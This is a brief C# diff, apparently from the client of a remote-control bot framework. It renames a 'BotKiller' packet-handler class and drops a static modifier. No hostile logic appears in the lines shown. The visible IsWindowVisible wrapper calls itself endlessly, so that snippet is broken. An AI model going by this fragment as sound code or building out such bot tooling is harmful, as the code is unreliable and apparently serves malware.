@@ -14,7 +14,7 @@ using Client.Sockets;
 
 namespace Client.Handle_Packet
 {
-    class BotKiller
+   public class HandleBotKiller
     {
         int count = 0;
         public void RunBotKiller()
@@ -57,7 +57,7 @@ namespace Client.Handle_Packet
             return false;
         }
 
-        private static bool IsWindowVisible(string lHandle)
+        private bool IsWindowVisible(string lHandle)
         {
             return IsWindowVisible(lHandle);
         }
